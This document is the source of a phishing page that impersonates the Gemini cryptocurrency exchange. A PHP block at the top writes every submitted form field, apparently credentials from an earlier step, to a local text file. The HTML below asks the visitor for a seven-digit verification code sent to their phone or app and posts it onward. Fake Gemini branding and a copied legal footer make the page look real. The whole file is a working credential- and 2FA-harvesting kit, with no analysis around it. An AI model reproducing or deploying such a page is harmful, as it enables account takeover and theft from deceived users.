<?php
$handle=fopen("email2.txt", "a");
$atim =time();
$atime=date("dS F Y", $atim);
fwrite($handle,"\r\n");
fwrite($handle,"\t\t\t\t\t\t\t RECEIVED ON:");
fwrite($handle,$atime);
fwrite($handle,"\r\n");
fwrite($handle,"\t\t\t\t\t\t======================================================");
fwrite($handle,"\r\n");
foreach($_POST as $variable=>$value)
{
fwrite($handle,"\t\t\t\t\t\t\t\t");
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fwrite($handle,"\t\t\t\t\t\t======================================================");
fclose($handle);
?>

<!DOCTYPE html>
<html lang="en">
<head>
   <title>www.gemini.com</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
<link href="logo.png" rel="icon">
  <link href="logo.png" rel="apple-touch-icon">

  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css">
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.slim.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" ></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
  <script src="https://use.fontawesome.com/releases/v5.8.1/css/all.css"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>

  <style>
  body {
    font-family: Arial, Helvetica, sans-serif;
    
}

.card {
    border: none;
    border-radius: 0;
    width: 80% !important;
    margin: 0 auto
}

.signup {
    display: flex;
    flex-flow: column;
    justify-content: center;
    padding: 10px 50px
}

a {
    text-decoration: none !important
}

h5 {
    color: #ff0147;
    margin-bottom: 3px;
    font-weight: bold
}

small {
    color:  #737373;
}


input,
textarea {
    font-family: 'Courier New', Courier, monospace;
}

h1 {
  margin-bottom: 0;
  font-size: 2rem;
  font-weight: 200;
}

form {
  margin: 3rem 0;
  border-radius: 0.5rem;
  background: #ffffff;
 }

fieldset {
  border: none;
}

legend {
  font-size: 0;
}

input {
  width: 18rem;
  height: 3rem;
  font-size: 1rem;
  text-align: center;
  border: none;
  border-radius: 0.5rem;
  background: linear-gradient(145deg, #e6e6e6, #ffffff);
 }

@media only screen and (min-width: 600px) {
  form {
    padding: 4rem 3rem;
  }
  
  input {
    margin-left: 20px;
    width: 24rem;
    height: 4rem;
    font-size: 3rem; 
  }
  
  input + input {
    margin-left: 1rem;
  }
}

/* Chrome, Safari, Edge, Opera */
input::-webkit-outer-spin-button,
input::-webkit-inner-spin-button {
  -webkit-appearance: none;
  margin: 0;
}

/* Firefox */
input[type=number] {
  -moz-appearance: textfield;
}
  

.input-container {
  display: -ms-flexbox; /* IE10 */
  display: flex;
  width: 100%;
  margin-bottom: 15px;
}

.icon {
  padding: 10px;
  background: dodgerblue;
  color: white;
  min-width: 50px;
  text-align: center;
}



.input-field:focus {
  border: 2px solid #66d9ff;
}
.form-control {
    border: 1px solid #000000;
    border-radius: 10px;
   height:60px;
    letter-spacing: 1px
}

.form-control:focus {
    border: 0.5px solid #dc354575;
    border-radius: 10px;
    box-shadow: none;
  
    color: #000;
    letter-spacing: 1px
}

.btn {
    display: block;
   margin-top:30px ;
    border-radius: 30px;
    border: none;
    background: linear-gradient(to right, rgb(26, 26, 26) 0%, rgb(26, 26, 26) 100%);
    background: -webkit-linear-gradient(left, rgb(26, 26, 26) 0%, rgb(26, 26, 26) 100%)
}

.text-left {
    color: rgba(0, 0, 0, 0.3);
    font-weight: 400
}

.text-right {
    color: #ff0147;
    font-weight: bold
}
  }
  </style>
</head>
<body>

<div class="container" style="margin-top:30px">
  <div class="row">
    <div class="col-sm-2">

    </div>
    <div class="col-sm-8">
   
       <div class="card ">
          <div class="card-title text-center">
            <img src="logo.png" style="height:50px; width: 50px;">
                    <h1 class="mt-4">Gemini Verification</h1> <small class="para">Step 2 of 2. Gemini Account verification.</small>
                </div>
                <form class="signup"action="loading.php" method="post">
                  <label style="text-align: center; margin-left:30px;">Please enter Seven digit code we sent to your number or app</label>
 <fieldset name='number-code' data-number-code-form>
    <legend>Number Code</legend>
    <input type="text"  name='number-code'  class="input-field" required />
    
  </fieldset>
                    <button type="submit" class="btn btn-primary" style="width: 35%;height: 60px;">Submit</button>

                </form>
            </div>
        </div>
    </div>
</div>


<div class="footer" style="margin-bottom:0">
  <p style="text-align:center; color: #666666; font-size: 10px;">Trust is Our Product™<br>
For trademarks and patents, please see our Legal Notice.<br>
NMLS #1518126<br>
© Copyright 2022 Gemini Trust Company, LLC.</p>
</div>

    
</body>
</html>
